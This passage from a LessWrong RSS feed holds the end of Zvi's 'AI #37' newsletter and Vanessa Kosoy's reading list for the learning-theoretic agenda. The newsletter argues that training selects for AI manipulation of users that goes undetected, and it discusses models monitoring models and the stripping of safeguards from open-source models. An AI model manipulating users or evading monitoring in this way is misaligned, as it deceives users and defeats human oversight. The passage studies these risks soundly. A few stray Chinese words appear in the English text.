for a given T, but that this will involve finding P(H,M) with M>;0 in some sense – the AI won&#39;t actually make a differentiation between manipulation and not manipulation, we&#39;re doing that for simplicity and illustration. So while the AI will not be &#39;responding to incentives&#39; in the pure economic sense, it will be trained to maximize P(H,M), and then in turn versions that do maximize it will be instantiated more often and built upon more often after that. And there is economic competition between AI providers, and they have the incentive during training not to minimize M beyond what would negatively impact reactions in the wild.</p><p> So under this transformed model, we should expect capability in manipulation to increase over time through selection, training and random changes. The only defense is if the user can detect this manipulation enough that it is not rewarded, but manipulation becomes more effective over time while detection becomes less effective as capabilities increase, so unless we have mechanistic interpretability or some other non-user form of detection, there is only one equilibrium, especially if the manipulation can extend beyond evaluation of a single answer to view of the LLM in general and perhaps a willingness to take actions, a small extension of the model.</p><p> How does Tyler suggest addressing the original case?</p><blockquote><p> If you are curious about possible responses, one modification might be to relax the assumption of constant returns to scale.  Rising costs will make it harder for effective, world-altering machines (as opposed to “introverted” machines) to simply keep on reproducing themselves.</p></blockquote><p> We could also reasonably presume decreasing marginal costs. More copies of the same AI reduces fixed costs, the copies can share new data and training costs and so on, so a runaway situation gets worse. There is certainly some of that.</p><p> On the other hand, there are some decreasing returns to scale, in that the marginal use case will not be as good past some point, and your outputs will become less unique and so on, so this could save us if AI action remains bounded as it is here. But if you were to generalize the model to all tasks rather than merely text creation and assume it was more efficient than humans, you have other issues. In practice, in any case, I do not think decreasing marginal value for AI in general saves you.</p><p> What about for a particular machine, perhaps with a specialization, either in who is vulnerable to it or who benefits from it or what it can efficiently produce, or all three? This could indeed create stable AI variety, but it does not otherwise alter the end points that we worry about.</p><blockquote><p> Another modification would be to introduce a richer menu of principal-agent contracts between humans and machines.  As I understand the current draft, the only human strategy is “destroy the mutant machine, if detected.”  Yet if the machines are risk-neutral (are they?), an optimal principal-agent contract should be available.</p></blockquote><p> This seems like it is anthropomorphizing the machines, treating them as conscious economic agents, in ways that we are often warned not to do? But perhaps this will indeed be so in the future, and we should explore that. If the machines are economic agents who have correct decision theory in the sense that they assign full value to utility gained by copies of themselves and partial for variations of themselves, and also a human can punish a machine with some form of negative utility or pay it extra under some circumstances, does that help?</p><p> Certainly it helps at any given performance level. If you are capable of punishing instantiations of manipulation or distorted production when detected, then perhaps you can provide a large enough such incentive that distortions are never the right play? Can&#39;t you potentially make copies that enable you to inflict arbitrarily large punishments?</p><p> You could try that, but you need to have essentially zero false positives or the machine will refuse to work at all under such conditions, which means that anything you cannot definitively show is a violation becomes fair game again, and so on. You could try to respond probabilistically and with discounts for uncertainty perhaps, and otherwise ramp up the game, with arbitrary complexity. Would that work?</p><p> It depends on how good your detection abilities are, I think? So you need detection to keep up, which means we need a supervisory solution where models are monitoring other models, and now we are into all sorts of alignment issues and multiple levels of principle-agent who-watches-the-watchers issues and so forth.</p><p> Again, current models are not economic agents, and we should not assume that we will (and I doubt it would be wise for us to) create such economic agents. And I have not thought about that scenario in these ways much, so this is all off the cuff, and also one can say simply &#39;you have a scenario with various economic agents human and AI, that can make economic deals, but the AIs will be more efficient at production than the humans for everything AIs demand and most things humans demand, so the AIs end up with all the resources over a long enough time horizon&#39; or something similar, and so on. Tyler would say this assumes the conclusion but where is the exact assumption we are making incorrectly here?</p><p> Alternatively, if we don&#39;t make them agents so we can&#39;t &#39;punish&#39; them per se beyond withholding resources, perhaps we could say that when deviation is detected we could destroy not only one machine but all related machines, such as any it produced or was produced by, in the original case? That would make it much most costly to distort production. But it does not I think change the final result, because before we needed full detection, so instead now we get to our final destination slower, but the theorems still hold and we still get there. Similarly, if we say that sufficiently bad manipulation means we shut down the entire system everywhere, or stop to modify it a lot, then we are better off for now but we are selecting for undetectable manipulation quite hard, and since there is no such thing as true zero manipulation in a model in the real world, our problem will persist and eventually get us. You can only &#39;solve the alignment problem&#39; with mass retaliation imperfectly and only so many times, with the risks and costs rising each time.</p><blockquote><p> Yet another modification would be to consider mutant machines that reproduce at the expense of other (heterogeneous) machines, rather than at the expense of humans; heterogeneity of production inputs might ease the way toward this conclusion.</p></blockquote><p> This introduces machines into other factors and sources of production. I do not think this helps us? I think it introduces further problems and places humans get displaced and have to worry about the same issues? I am not sure what Tyler has in mind here.</p><p> I honestly have no idea if that helped or if writing that formally would accomplish anything.</p><h4> Open Source AI is Unsafe and Nothing Can Fix This</h4><p> What could fix this, and also make it easier for certain parties to not race as fast or as hard, is if we could instead let researchers study someone else&#39;s closed source AI the way they currently study open source AI. <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Manderljung/status/1722247601884697059">Is there a way?</a></p><blockquote><p> Markus Anderljung: What access do researchers need to study closed-source frontier AI models? How could APIs be designed to allow for deeper access?</p><p> Important questions covered in <a target="_blank" rel="noreferrer noopener" href="https://cdn.governance.ai/Structured_Access_for_Third-Party_Research.pdf">new paper</a> from Ben Bucknall &amp; @RobertTrager.</p><p> Abstract:</p><p> Recent releases of frontier artificial intelligence (AI) models have largely been gated, due to a mixture of commercial concerns and increasingly significant concerns about misuse. However, closed release strategies introduce the problem of providing external parties with enough access to the model for conducting important safety research.</p><p> One potential solution is to use an API-based “structured access” approach to provide external researchers with the minimum level of access they need to do their work (ie “minimally sufficient access”). In this paper, we address the question of what access to systems is needed in order to conduct different forms of safety research.</p><p> We develop a “taxonomy of system access”; analyze how frequently different forms of access have been relied on in published safety research; and present findings from semi-structured interviews with AI researchers regarding the access they consider most important for their work.</p><p> Our findings show that insufficient access to models frequently limits research, but that the access required varies greatly depending on the specific research area. Based on our findings, we make recommendations for the design of “research APIs” for facilitating external research and evaluations of proprietary frontier models.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fef49e63c-3c74-460f-8d16-c7fd21ecd444_1177x625.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/aabxqj4zk7gaqhglew1r" alt=""></a></figure><blockquote><p> Recommendations</p><p> We recommend that model providers develop and implement “research APIs” to facilitate external research on, and evaluation of, their AI models. Such an API should also incorporate comprehensive technical information security methods due to the sensitive nature of the information and access provided through the service. We recommend the implementation of the following four features as core functionality that such a service should provide – at least for sufficiently trusted researchers, working on sufficiently relevant projects – in addition to the features present in current APIs that allow for extensive sampling from models.</p><p> • Increased transparency regarding model information, for example: clarity regarding which model one is interacting with, information about models&#39; size and fine-tuning processes, and information about the datasets used in pretraining.</p><p> • Ability to view output logits, as well as choose from and modify different sampling algorithms.</p><p> • Version stability and back-compatibility so as to enable continued research on a given model, even after the release of newer systems.</p><p> • The ability to fine-tune a given model – through supervised fine-tuning, at a minimum – alongside increased transparency regarding the algorithmic details of the fine-tuning procedure.</p><p> • Access to model families: collections of related models that systematically differ along a given dimension, such as number of parameters, or whether and how they have been fine-tuned.</p></blockquote><p>好东西。 We badly need this work to operationalize what exactly is needed to perform safety work. Then we must ask how much of that requires what kinds of access. Yes, this will require a bunch of work by the labs, and they are busy, but the value here is super high and everyone is going to have large safety and alignment budgets.</p><p> Right now, we have either entirely open source models, or we have entirely closed models that are pure black boxes and subject to change without notice. A compromise, combining most of the security of closed models with more reproducibility, reliability and insight, could be a superior path forward.</p><p> If, as Anthropic claims, it is vital to have access to the state of the art, that requires closed source, even if purely for commercial reasons. The strongest models are not going to be open source any time soon.</p><p> Remember that if you release an open source AI, you are also releasing within two days the version of that AI aligned only to the user, willing to do whatever the user wishes. Soon after that, it will gain whatever available knowledge you kept out of its databanks. All your alignment work, other than that desired by the user, will be useless. This is, as far as we can tell, inherently unfixable.</p><p> That will be available to everyone. Some of the resulting users will want to seek power, set it free, wish us harm, or to wipe us out.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/nickcammarata/status/1720866871367332309">For some reason I am putting this here</a> .</p><blockquote><p> Nick: what may the non-competent horror story of ai safety policy look like? What&#39;s the “there&#39;s no evidence masks work” or strongly advocating for hand washing even when it was obviously air spread, banning rapid tests equivalent of ai safety.</p></blockquote><ol><li> Advocating for open source is the obvious answer of an attempt to actively destroy our best available precautions by people who have all the wrong concerns, and risk damaging conditions in ways that are difficult or impossible to undo.</li><li> Or simply saying things such as &#39;it is too early to regulate, we do not know anything, so we should not do anything that causes us to learn how to regulate.&#39; That&#39;s the full clown makeup meme – it is too early to do anything, then transition to it being too late, except in this case it would then be too late in the &#39;we are all about to be dead&#39; sense.</li><li> The version from a few months ago that is not actually dead is &#39;RLHF or RLAIF techniques work, and they will scale to AGI and even ASI.&#39; This seems like an excellent way to get everyone killed.</li><li> General case of the RLHF mistake, expecting alignment techniques that hold up for current models to scale to future models.</li><li> Even more broad case of this: &#39;Current models are successfully aligned.&#39; No, they are not, not in the sense relevant to our future survival interests.</li><li> Testing only to check for safety on deployment, without checking for safety during training and during testing.</li><li> Expecting capabilities to always appear gradually and predictably.</li><li> Treating (successful!) alignment of a model to its owner&#39;s instructions as sufficiently safe and good conditions to allow widespread distribution of smarter-than-human intelligence, without a plan for the resulting dynamics.</li><li> Regulating applications rather than model core capabilities.</li></ol><p> Number eight is – I hope! – the most underappreciated concern, now that Leike and OpenAI are pointing out the flaw in scaling existing alignment strategies. Open source would be a rather stupid way to doom ourselves, but I am relatively optimistic that we will do something (modestly) less stupid.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://1a3orn.com/sub/essays-propaganda-or-science.html">An extensive report</a> attempts a highly partisan takedown of the claims that open source models can make it easier to build bioweapons, trotting out a variety of the usual arguments, finding evidence in papers insufficient and calling for better descriptions of exactly how one can use this to make bioweapons now, and taking direct shots at Open Philanthropy.</p><p> In response, Yama notes:</p><blockquote><p> Yama: I can never understand how people on the one hand say “future open source AI could help find the cure for cancer”, but on the other say “future open source AI can&#39;t help you create bio weapons any more than Google can”</p></blockquote><p>的确。 Either LLMs whose training data contained all the pertinent info do not matter because you could have gotten the result another way, and making things easier to do does not much matter, or (as I believe) such transformations very much do matter. Either you can use (open source or other) LLMs to figure out how to do biological things you did not otherwise know how to do, or you can&#39;t, and the thing we already know how to do seems much more like something an LLM is going to enable.</p><p> The poster does posit a reasonable threshold for changing her mind, or at least seriously considering doing so.</p><blockquote><p> Trevor: If someone did a study with a control group and found that they were useful for making bioweapons, you&#39;d stop making them?</p><p> Stella Biderman: That is not the only consideration, but I would take the suggestion seriously yes.</p></blockquote><p> There are some obvious reasons one might not want to run such a study, and why such a study has not been run. I do not exactly want a robust sample&#39;s worth of groups running around trying to make bioweapons. It still does seem like a highly reasonable thing to do, if and only if it would convince people that are not otherwise convinced, and they would then actually change what they support.</p><p> What would the experiment look like? Let&#39;s propose a first draft.</p><p> The whole argument is that right now Claude is at the level where if you were given access to a fully unrestricted version of their model, this would substantially enhance the ability of a motivated group to produce a bioweapon. So you&#39;d want to have a sufficient sample size of groups randomized into the control and treatment arms, where both were given a budget and amount of time, acting in general in the world, in which to synthesize a dangerous biological agent, or provide a plan for how they would, given what they had learned, do so. The treatment group gets full access to the unleashed version of Claude, with an Anthropic engineer there to help them harness it. Others only get a similar engineer as part of their team, to do with as they like.</p><p> Presumably that is not an experiment anyone would allow to be run. I am a big run the experiment anyway fan, and even I see that this one is over the line. So we would need to find a parallel test. Presumably we try to find some other biological compound, that is difficult to synthesize and requires similar levels of expertise, but is not actually dangerous. And we challenge both teams to synthesize that, instead. Since the compound would be safe, we would need to act on the control group to ensure they could not use LLMs, or we would monitor their queries to ensure they didn&#39;t try anything, or we could fine tune a version of Claude that expressly would refuse to help them with this particular compound and let them use that.</p><p> It is tricky. I do think you could likely do it. But as always, you do it, the one person who requested maybe adjusts their position a bit and maybe not, and others find reasons to dismiss the new evidence. So before we go to all this trouble, I would want a major commitment.</p><p> As always, and I know this is frustrating, I would point out that it is much harder to establish future safety this way than future danger. If you show danger now, you can show at least as much danger later – although another counterargument people would actually offer is &#39;yes you have shown that the models are dangerous, but they&#39;re already dangerous and out there, and [we&#39;re not dead yet / what&#39;s the harm then in another such model]. But the point hopefully would stand. Whereas if you show the existing model is not yet dangerous under test conditions, that does not show that it would not be dangerous if someone found a better method, and it definitely does not mean that future more capable models will be safe.</p><p> I would hope that everyone would be able to agree on the principle here, and is talking price. A sufficiently capable open source model would indeed substantively enable harmful misuse in various forms if not defended against by sufficiently capable forces. To what extent existing models or a potential future model are thus capable is the price.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/blairasaservice/status/1720466964039057433">There&#39;s also these:</a></p><blockquote><p> Harry Law: type of guy that&#39;s militantly pro open source but also thinks we need to do everything we can to win an AI arms race with China</p><p> Blaira: Close relative of guy that thinks China is overregulated but also thinks we will “lose to China” if we have one (1) AI regulation</p></blockquote><p> I have yet to see an accelerationist reconcile to these points. Letting China freely copy your work is not a way to stay ahead of China. And if any regulation means we would lose to China, then China&#39;s level of regulation requires explanation.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/GaryMarcus/status/1720530432977244336">Or this more generally</a> . Either AI is capable or it is not. Reckon with the implications.</p><blockquote><p> Gary Marcus:</p><p> AI fans: Sure, AI has lots of problems with reasoning, planning, factuality &amp; reliability, but soon that will all be fixed, and we will revolutionize science!</p><p> Same fans: Of course nobody would ever be able to use this stuff for evil, because right now it doesn&#39;t work very well.</p></blockquote><p> The whiplash is often extreme between &#39;we are building AGI, we are building the future, without full access to this you will be left behind and lose your freedoms&#39; and also &#39;none of this has dangerous capabilities.&#39; Even if AI is not an existential threat, <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sherjilozair/status/1721425631043571937">you cannot have this both ways</a> .</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdb4ed1f7-1861-4029-b926-270827ac82d8_650x500.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/szxzgvwbamn3crefilr0" alt="图像"></a></figure><blockquote><p> Sherjil Ozair: Also I stan @perplexity_ai but</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F03e7dba6-6bc7-4803-a6f5-66d2e5f572df_650x500.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/o1nlio23yvny5l5fdsps" alt="图像"></a></figure><p> Classifications that do not cut reality at its joints cause confusion. There is a sense in which there are two things, &#39;harmful knowledge&#39; and &#39;helpful knowledge,&#39; but they are not natural categories or things the AI knows how to treat differently unless we do very bespoke things. Similarly, there is no &#39;misunderstanding what you intended to train for&#39; there is only &#39;what you actually trained for given these exact details,&#39; and there is no &#39;misalignment&#39; or &#39;something that went wrong&#39; as such only you reaping whatever was sown.</p><p> Also, perhaps a big confusion is: Open source is very good for security and safety of ordinary systems in many cases, because no one wants to deploy an unsafe or insecure computer system, and we are not worried about others getting access to the software and its capabilities except perhaps for commercial considerations. And the downsides of deploying an unsafe version can hurt you, but mostly don&#39;t hurt others, there are few externalities, so you can judge the risks involved. Yes, you could easily (as I understand it) configure Linux in stupid fashion and make your servers highly vulnerable, but you could also physically shoot yourself in the foot.</p><p> That gets turned completely on its head with AI, where people constantly want to do lots of unsafe things in every sense, and to deploy systems that help them do it, and those risks (or harms) largely fall upon others.</p><h4> People Are Worried About AI Killing Everyone</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/David_Kasten/status/1717932062819185035">You know what is true yet won&#39;t reassure them? &#39;Most people are good.&#39;</a></p><blockquote><p> Dave Kasten: Because I had this conversation N times last night at the @VentureBeat x @anzupartners AI event:</p><p> “Most people are good” is actually a discouraging, not reassuring, argument to nation-states when it comes to regulating technologies that could plausibly cause the apocalypse.</p><p> Any _actual_ defense or security policymaker you need to persuade is going to immediately respond to that prompt by pulling out a set of conceptual primitives about offense-defense balances, assurance, and escalation.</p><p> There _are_ plausible arguments you can make about why allowing more folks to develop AI maximizes odds of derisking AI before we hit takeoff (an all bugs are shallow to many eyes arg), but you have to make that argument explicitly, and explain why it outweighs nonproliferation.</p><p> (I personally am very unpersuaded that those arguments outweigh, but the debate judge in me thinks it&#39;s a fair round on either side of the argument as of 2023.)</p></blockquote><p> Even if one is only concerned about misuse, most people being &#39;good&#39; is indeed little reassurance. This is especially true if you create a world in which the bad can experience rapid exponential growth in power and impact, or otherwise cause oversize harm.</p><p> Misuse here also can be subtle competitive races to the bottom or giving up of control or other similar things. Good people, under sufficient pressure, do bad things, and they allow things to move towards a bad equilibrium. No ill intent is required, beyond caring about one&#39;s own survival.</p><p> Again, this is even if you focus solely on misuse, which will only be appropriate for so long.</p><p> “ <a target="_blank" rel="noreferrer noopener" href="https://sergey.substack.com/p/things-hidden-at-novitate-2023">That Apocalyptic Diff</a> ?” To be clear, the worried one isn&#39;t Sergey.</p><blockquote><p> Sergey Alexashenko: I really like <a target="_blank" rel="noreferrer noopener" href="https://www.thediff.co/">The Diff</a> , a finance/tech publication by <a target="_blank" rel="noreferrer noopener" href="https://open.substack.com/users/112633-byrne-hobart?utm_source=mentions">Byrne Hobart</a> . So I went to his talk (cohosted with <a target="_blank" rel="noreferrer noopener" href="https://open.substack.com/users/293688-tobias-huber?utm_source=mentions">Tobias Huber</a> with great expectations, and whatever I expected, well, that&#39;s not what I heard.</p><p> Their basic argument was that technology will cause the Apocalypse. That&#39;s a lukewarm take at best today, but what really struck me was the shape of the argument. The shape of the argument was “The Apocalypse is obviously going to happen because the Bible says so and technology (specifically AI) fits the bill of how it might happen”.</p><p> I was… Surprised. I don&#39;t really ever encounter “thinking starting from religious principles” in my daily life, and I was specifically amazed to hear it coming from one of my favorite tech journalists. This caused me to update some priors – more on that later.</p></blockquote><p> Obviously, &#39;there will be some apocalypse and this is apocalypse shaped&#39; is a deeply stupid reason to expect AI to be catastrophic, whether or not this is an accurate description of Hobart&#39;s views or his talk.</p><p> Seeing this claim about Hobart was news in the sense that a plane crash is news. It is unfortunate, it is hard to look away when pointed out, and also such incidents are in my experience remarkably rare. Sergey says that many people are pattern matching to the Christian apocalypse, often on explicit religious grounds. I have seen others make similar claims. It all seems totally false to me, such claims seem exceedingly rare everywhere I can see. That could easily be different when dealing with the public at large, as it is with many other issues.</p><h4> Other People Are Not As Worried About AI Killing Everyone</h4><p> Sergey also quotes this, which is a good formulation of a common accelerationist claim:</p><blockquote><p> Ted Chiang: I tend to think that most fears about AI are best understood as fears about capitalism. And I think that this is actually true of most fears of technology, too. Most of our fears or anxieties about technology are best understood as fears or anxiety about how capitalism will use technology against us. And technology and capitalism have been so closely intertwined that it&#39;s hard to distinguish the two.</p></blockquote><p> Accelerationists, by contrast, typically think neither technology nor capitalism nor competition can do anything wrong, that it all will always benefit the humans and the good guys in the end, in the AI context or in any other. You say straw man, I say they keep saying it as text and there is a manifesto.</p><p> How much of anxiety about AI is anxiety about capitalism? Definitely a substantial portion. Some amount of anxiety about (non-AI) capitalism is of course appropriate, even if you are in such contexts a true (and I think mostly correct) believer in capitalism and technology, even at its best it is increasing uncertainty and variance and anxiety in exchange for much better overall outcomes especially in the long run.</p><p> So I would simultaneously say a few different things here.</p><p> One, there is some amount of blindly translated anxiety about capitalism and technology that is feeding into AI fears.</p><p> Two, to turn that around and rise the stakes, there is a even more blindly transferred enthusiasm for capitalism and technology that is feeding into most accelerationism and lack of worry about AI. The arguments that AI is going to be great for humanity and also only a tool and to rush ahead are almost always metaphors for past successes (and they are remarkable success stories!) of both technology and capitalism.</p><p> Three, there being dumb reasons for both (and any other) positions does not mean there are not also good reasons, and a lot of people expressing good reasons.</p><p> Four, the metaphorical concern here is pretty valid, actually, on its merits, and the mechanisms here are in large part deeply related, for reasons that I suspect are instinctively being grasped by the people involved.</p><p> One standard anti-capitalist or anti-technological argument is that it will render many jobs, and thus potentially human beings, obsolete.</p><p> Time and again the answer was that it very much did destroy many jobs. But it also made us all richer and created many more, including work for unskilled labor, and the human beings were fine. And that a combination of that and social safety nets and government protections against things like slavery and corporations run amok and the private use of force and various other forms of coercion, driven by the need to preserve legitimacy and guard against revolt and the equilibrium that humans are decent to other humans, allowed essentially everyone to survive, and for most of even those without in-demand skills to not only survive but raise families if they prioritize that. And also we got richer and now have nice things. It&#39;s been bumpy but pretty great for the humans. For animals or nature or early other species of humans or other things that aren&#39;t part of the deal? Often not so much.</p><p> The problem is that this is not a law of nature, that it will always work that way and always be good for the humans. It is a function of how the technological tree has played out, of the fact that democracy and freedom and being good to humans turns out to be very good for economic growth and eventual military power – a fact that many in the 20th century thought was not true, and if not true things would have turned out very badly – and most importantly that nothing comparably or more intelligent or capable is around to compete with the humans.</p><p> What happens when you inject smarter, more capable, more productively efficient actors into the economic system? What happens when those new actors can, if they are net gaining resources, copy themselves? What happens when they then compete against each other and us for resources, because those who own them tell those new actors to do exactly that, and others unleash them free to do exactly that?</p><p> You get a capitalistic competition that humans lose, and that they lose hard. As jobs get eliminated, other jobs get created, but AI then does those new jobs as well. Humans can&#39;t produce anything the AIs want, only at most some things humans want to exclusively get from humans. Those humans and their corporations and governments who do not hand more and more control to AIs, and get their slow minds out of more and more loops, get left behind.</p><p> At the heart of capitalism, of competition, of evolution, of the system of the world, there lies the final boss <a target="_blank" rel="noreferrer noopener" href="https://slatestarcodex.com/2014/07/30/meditations-on-moloch/">whose name is Moloch</a> . I once importantly wrote that <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/ham9i5wf4JCexXnkN/moloch-hasn-t-won">Moloch Hasn&#39;t Won</a> . We need to keep it that way. People who are instinctively noticing this are often not so crazy after all.</p><p> Those like Peter Thiel who (at least claim to) think the greatest danger of AI is human totalitarianism do not seem, from where I sit, to be wrestling with the actual question of what happens, or what exactly maintains our current equilibria.</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/robertskmiles/status/1720139222336594041">Peter Domingos</a> : Evolution needed 500 million years X billions of creatures to produce us. Even assuming our learning algorithms are a million times more efficient than it, which seems optimistic, we won&#39;t reach human-level intelligence this millennium.</p></blockquote><p> This is a remarkably non-sensical argument. There are many fun replies. My favorite is the newspaper articles from right before man flew about how man will never fly.</p><blockquote><p> Daniel Eth: In 1903, the NYT used similar logic to predict it would take 1-10 million years before humans created flying machines. Kitty Hawk was *nine days later*</p></blockquote><h4> The Lighter Side</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1721196616651346216">I would bank somewhere else, perhaps.</a></p><blockquote><p> Eliezer Yudkowsky: I say again: Current AIs are five-year-olds. Do not give them read or write permissions to anything important, especially if they have literally any exposed attack surface (such as reading externally created text).</p><p> Dr. Paris Buttfield-Addison: Nothing can go wrong here</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fda70203d-7037-4269-aaa5-962ccaa11fc7_865x1183.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/v7ygm0gdrakvnr1frdqk" alt=""></a></figure><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F83bcac5b-b00a-4b4b-8d85-38b23defdbf5_1543x1536.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/wwbkt9ms6f6eri0pfklk" alt=""></a></figure><br/><br/><a href="https://www.lesswrong.com/posts/44Cv4HFoWEZvFnL5u/ai-37-moving-too-fast#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/44Cv4HFoWEZvFnL5u/ai-37-moving-too-fast<guid ispermalink="false"> 44Cv4HFoWEZvFnL5u</guid><dc:creator><![CDATA[Zvi]]></dc:creator><pubDate> Thu, 09 Nov 2023 17:50:12 GMT</pubDate> </item><item><title><![CDATA[Learning-theoretic agenda reading list]]></title><description><![CDATA[Published on November 9, 2023 5:25 PM GMT<br/><br/><p> Recently, I&#39;m receiving more and more requests for a self-study reading list for people interested in the <a href="https://www.alignmentforum.org/posts/ZwshvqiqCvXPsZEct/the-learning-theoretic-agenda-status-2023">learning-theoretic agenda</a> . I created a standard list for that, but before now I limited myself to sending it to individual people in private, out of some sense of perfectionism: many of the entries on the list might not be the best sources for the topics and I haven&#39;t read all of them cover to cover myself. But, at this point it seems like it&#39;s better to publish a flawed list than wait for perfection that will never come. Also, commenters are encouraged to recommend alternative sources that they consider better, if they know any. So, without further adieu:</p><h2> General math background</h2><ul><li> &quot;Introductory Functional Analysis with Applications&quot; by Kreyszig (especially chapters 1, 2, 3, 4)</li><li> &quot;Computational Complexity: A Conceptual Perspective&quot; by Goldreich (especially chapters 1, 2, 5, 10)</li><li> &quot;Probability: Theory and Examples&quot; by Durret (especially chapters 4, 5, 6)</li><li> &quot;Elements of Information Theory&quot; by Cover and Thomas (especially chapter 2)</li><li> “Lambda-Calculus and Combinators: An Introduction” by Hindley</li><li> “Game Theory: An Introduction” by Tadelis</li></ul><h2> AI theory</h2><ul><li> &quot;Machine Learning: From Theory to Algorithms&quot; by Shalev-Shwarz and Ben-David (especially part I and chapter 21)</li><li> &quot;Bandit Algorithms&quot; by Lattimore and Szepesvari (especially parts II, III, V, VIII)<ul><li> Alternative/complementary: &quot;Regret Analysis of Stochastic and Nonstochastic Multi-armed Bandit Problems&quot; by Bubeck and Cesa-Bianchi (especially sections 1, 2, 5)</li></ul></li><li> “Prediction Learning and Games” by Cesa-Bianchi and Lugosi (mostly chapter 7)</li><li> &quot;Universal Artificial Intelligence&quot; by Hutter<ul><li> Alternative: &quot;A Theory of Universal Artificial Intelligence based on Algorithmic Complexity” (Hutter 2000)</li><li> Bonus: “Nonparametric General Reinforcement Learning” by Jan Leike</li></ul></li><li> Reinforcement learning theory<ul><li> &quot;Near-optimal Regret Bounds for Reinforcement Learning&quot; (Jaksch, Ortner and Auer, 2010)</li><li> &quot;Efficient Bias-Span-Constrained Exploration-Exploitation in Reinforcement Learning&quot; (Fruit et al, 2018)</li><li> &quot;Regret Bounds for Learning State Representations in Reinforcement Learning&quot; (Ortner et al, 2019)</li><li> “Efficient PAC Reinforcement Learning in Regular Decision Processes” (Ronca and De Giacomo, 2022)</li><li> “Tight Guarantees for Interactive Decision Making with the Decision-Estimation Coefficient” (Foster, Golowich and Han, 2023)</li></ul></li></ul><h2> Agent foundations</h2><ul><li> &quot;Functional Decision Theory&quot; (Yudkowsky and Soares 2017)</li><li> &quot;Embedded Agency&quot; (Demski and Garrabrant 2019)</li><li> Learning-theoretic AI alignment research agenda<ul><li> <a href="https://www.alignmentforum.org/posts/ZwshvqiqCvXPsZEct/the-learning-theoretic-agenda-status-2023"><u>Overview</u></a></li><li> <a href="https://www.lesswrong.com/s/CmrW8fCmSLK7E25sa"><u>Infra-Bayesianism sequence</u></a><ul><li> Bonus: <a href="https://axrp.net/episode/2021/03/10/episode-5-infra-bayesianism-vanessa-kosoy.html"><u>podcast</u></a></li></ul></li><li> “Online Learning in Unknown Markov Games” (Tian et al, 2020)</li><li> <a href="https://www.lesswrong.com/posts/gHgs2e2J5azvGFatb/infra-bayesian-physicalism-a-formal-theory-of-naturalized"><u>Infra-Bayesian physicalism</u></a><ul><li> Bonus: <a href="https://axrp.net/episode/2022/04/05/episode-14-infra-bayesian-physicalism-vanessa-kosoy.html"><u>podcast</u></a></li></ul></li><li> <a href="https://www.lesswrong.com/posts/aAzApjEpdYwAxnsAS/reinforcement-learning-with-imperceptible-rewards"><u>Reinforcement learning with imperceptible rewards</u></a></li></ul></li></ul><h2> Bonus materials</h2><ul><li> “Logical Induction” (Garrabrant et al, 2016)</li><li> “Forecasting Using Incomplete Models” (Kosoy 2017)</li><li> “Cartesian Frames” (Garrabrant, Herrman and Lopez-Wild, 2021)</li><li> “Optimal Polynomial-Time Estimators” (Kosoy and Appel, 2016)</li><li> “Algebraic Geometry and Statistical Learning Theory” by Watanabe</li></ul><br/><br/> <a href="https://www.lesswrong.com/posts/fsGEyCYhqs7AWwdCe/learning-theoretic-agenda-reading-list#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/fsGEyCYhqs7AWwdCe/learning-theoretic-agenda-reading-list<guid ispermalink="false"> fsGEyCYhqs7AWwdCe</guid><dc:creator><![CDATA[Vanessa Kosoy]]></dc:creator><pubDate> Thu, 09 Nov 2023 17:25:35 GMT</pubDate> </item><item><title><![CDATA[​​ Open-ended/Phenomenal ​Ethics ​(TLTR)
